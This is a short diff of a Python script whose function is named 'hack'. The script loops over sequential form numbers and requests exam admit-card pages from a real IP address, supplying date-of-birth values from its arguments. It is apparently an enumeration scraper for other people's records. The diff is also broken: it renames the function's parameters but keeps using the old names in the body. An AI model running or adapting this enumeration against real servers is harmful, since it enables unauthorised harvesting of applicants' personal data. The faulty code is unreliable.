@@ -49,15 +49,15 @@ else:
 	
 
 x = 0 # This defines X as a globally accessible variable. See bottom.
-def hack(start, end): # Mind you the actual function is called at the bottom.
+def hack(s, e): # Mind you the actual function is called at the bottom.
 	global x
-	x = start
-	while x < end:
+	x = int(start)
+	i_end = int(end)
+	while x < i_end:
 		# 
 		# Get the url we need
 		#
 		url = 'http://14.140.247.111/admitcard/wpadmitcard.asp?formno=14J'
-		x = '766475'
 		url += str(x)
 		url += '&dd=' + args[2]
 		url += '&mm=' + args[3]
